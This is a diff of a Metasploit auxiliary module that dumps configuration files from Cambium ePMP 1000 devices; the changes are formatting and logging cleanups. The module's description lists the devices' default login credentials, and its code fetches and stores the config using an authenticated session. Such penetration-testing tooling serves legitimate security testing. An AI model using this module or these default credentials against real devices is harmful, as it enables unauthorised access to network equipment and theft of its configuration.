@@ -7,25 +7,30 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::EPMP
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Cambium ePMP 1000 Dump Device Config',
-      'Description' => %{
+    super(
+      update_info(
+        info,
+        'Name' => 'Cambium ePMP 1000 Dump Device Config',
+        'Description' => %q{
           This module dumps Cambium ePMP 1000 device configuration file. An
           ePMP 1000 box has four (4) login accounts - admin/admin, installer/installer,
           home/home, and readonly/readonly. This module requires any one of the following
           login credentials - admin / installer / home - to dump device configuration
           file.
-      },
-      'Author' =>
-        [
+        },
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'References' =>
-        [
+        'References' => [
           ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/']
         ],
-      'License' => MSF_LICENSE
-     )
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
     )
 
     register_options(
@@ -47,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
 
   # Dump config
   def dump_config(config_uri, cookie)
-    print_status("#{rhost}:#{rport} - Attempting to dump configuration...")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Attempting to dump configuration...")
     res = send_request_cgi(
       {
         'method' => 'GET',
@@ -68,11 +73,11 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     if good_response
-      print_good("#{rhost}:#{rport} - File retrieved successfully!")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - File retrieved successfully!")
       path = store_loot('ePMP_config', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 device config')
-      print_status("#{rhost}:#{rport} - File saved in: #{path}")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - File saved in: #{path}")
     else
-      print_error("#{rhost}:#{rport} - Failed to retrieve configuration")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to retrieve configuration")
     end
   end
 
